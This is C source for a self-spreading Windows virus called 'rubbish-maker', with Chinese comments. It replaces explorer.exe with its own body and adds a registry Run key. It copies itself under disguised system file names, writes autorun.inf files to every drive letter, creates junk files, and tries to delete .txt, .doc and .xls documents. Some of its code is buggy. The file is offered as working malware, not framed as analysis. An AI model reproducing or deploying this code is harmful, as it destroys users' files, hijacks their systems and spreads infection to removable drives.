/**
 * rubbish-maker
 * @author unknown
 */

#include <stdio.h>       /* 标准输入输出 */ 
#include <string.h>      /* 字符串操作 */ 
#include <stdlib.h>      /* 其它函数 */ 
#include <process.h>     /* 进程控制 */
#include <dir.h>         /* 目录函数 */

#define SVCHOST_NUM 6     /* 关键位置病毒复制数量 */
#define RUBBISH_NUM 5     /* 垃圾文件数量 */
#define REMOVE_NUM 5      /* 删除文件数 */ 

/*
  文件AUTORUN.INF内容：
  1.自动运行SVCHOST.com
  2.覆盖默认打开命令，使用病毒体作为新的打开方式
  3.覆盖默认资源管理器命令，使病毒体作为新的命令方式
*/ 
char *autorun={"[AutoRun]\nopen=\"SVCHOST.com /s\"\nshell\\open=打开(&O)\nshell\\open\\Command=\"SVCHOST.com /s\"\nshell\\explore=资源管理器(&X)\nshell\\explore\\Command=\"SVCHOST.com /s\""};

/*
  添加注册表项：
  1.自动运行生成病毒体 C:\windows\wjview32.com
*/
char *regadd={"REGEDIT4\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"wjview32\"=\"C:\\\\windows\\\\wjview32.com /s\""};

/**
 * 复制文件
 * @param {*} 复制源
 * @param {*} 目的地
 * @return 成功返回0，失败返回1
 */ 
int copy (char *infile, char *outfile)
{
  FILE *input, *output;
  char temp;

  if (strcmp(infile,outfile) != 0 && ((input = fopen(infile,"rb")) != NULL) && ((output = fopen(outfile,"wb")) != NULL))
  {
    while (!feof(input))
    {
      fread(&temp, 1, 1, input);
      fwrite(&temp, 1, 1, output);
    }
    fclose(input);
    fclose(output);
    return 0;
  }
  
  else return 1;
}

/**
 * 通过explorer自动运行 
 * @return {int} 成功返回0;失败返回1,2
 */ 
int autorun_explorer ()
{
  FILE *input;
  if((input=fopen("c:\\windows\\system\\explorer.exe", "rb"))!=NULL)
  {
    fclose(input);
    remove("c:\\windows\\$temp$");
    remove("c:\\windows\\system32\\dllcache\\$temp$");
    return 1;
  }

  copy("c:\\windows\\explorer.exe","c:\\windows\\system\\explorer.exe");
  rename("c:\\windows\\explorer.exe","c:\\windows\\$temp$");
  rename("c:\\windows\\system32\\dllcache\\explorer.exe", "c:\\windows\\system32\\dllcache\\$temp$");
  
  if(copy("SVCHOST.com","c:\\windows\\explorer.exe") == 0 && copy("SVCHOST.com","c:\\windows\\system32\\dllcache\\explorer.exe")==0)
    return 0;
  else
    return 2;
}

/**
 * 添加注册表项 
 * @return {int} 成功返回0;失败返回1,2
 */ 
int add_reg ()
{
  FILE *output;
  if((output=fopen("$$$$$", "w"))!=NULL)
  {
    fprintf(output,regadd);
    fclose(output);
    spawnl(1,"c:\\windows\\regedit.exe"," /s $$$$$", NULL);
  }
}

/**
 * 复制病毒 + Autorun.inf自动运行 
 * @return none
 */ 
void copy_virus ()
{
  int i,k;
  FILE *input, *output;
  char *files_svchost[SVCHOST_NUM] = {"svchost.com","c:\\windows\\wjview32.com","c:\\windows\\system\\MSMOUSE.DLL","c:\\windows\\system32\\cmdsys.sys","c:\\windows\\system32\\mstsc32.exe","c:\\windows\\explorer.exe"};
  char temp[2][20] = {"c:\\svchost.com","c:\\autorun.inf"};
  
  for(i = 0; i< SVCHOST_NUM; i ++)
  { 
    if((input=fopen(files_svchost[i],"rb"))!=NULL)
    {
      fclose(input);
      for(k=0;k<SVCHOST_NUM;k++)
      {
        copy(files_svchost[i],files_svchost[k]);
      }
      i=SVCHOST_NUM;
    }
  }

  for(i = 0; i < SVCHOST_NUM; i ++)
  {
    if((input=fopen(files_svchost[i],"rb"))!=NULL)
    {
      fclose(input);
      for(k=0;k<24;k++)
      {
        copy(files_svchost[i],temp[0]);
        if((output=fopen(temp[1],"w"))!=NULL)
        {
          fprintf(output,"%s",autorun);
          fclose(output);
        }
        temp[0][0]++;
        temp[1][0]++;
      }
      i=SVCHOST_NUM;
    }
  }
}

/**
 * 制造垃圾文件
 * @return none
 */ 
void make_rubbish ()
{
  int i;
  FILE *output;
  srand(0);
  for(i = 0; i < RUBBISH_NUM; i ++)
  {
    int n;
    char s[30];
    n = rand();
    sprintf(s, "C:\\DESTORY_感染_%d", n);
    if((output=fopen(s,"w")) != NULL) {
      fprintf(output,"%ld%s",n*n,s);
      fclose(output);
    }
  }
}

/**
 * 删除文件
 * @return none
 */ 
void remove_files ()
{
  long done;
  int i;
  struct _finddata_t ffblk;
  char *remove_files[3]={"*.txt","*.doc","*.xls"};
  
  for(i = 0; i < 3; i ++)
  {
    if(_findfirst(remove_files[i],&ffblk)==-1) {
      continue;
    }
    
    while(!done)
    {
      remove(ffblk.name);
      _findnext(done,&ffblk);
    }

    _findclose(done);
  }
}

/**
 * 主程序
 * @return none
 */ 
int main (int argc, char **argv)
{
  int contral = 0;
  
  autorun_explorer();
  spawnl(1, "c:\\windows\\system\\explorer.exe", NULL);

  if (argc > 1) {
    if (strcmp(argv[1], "/s") == 0) {
      add_reg();
      copy_virus();
      make_rubbish();
      spawnl(1, "c:\\windows\\system32\\mstsc32.exe"," /s", NULL);
    }
  }
  
  return 0;
}

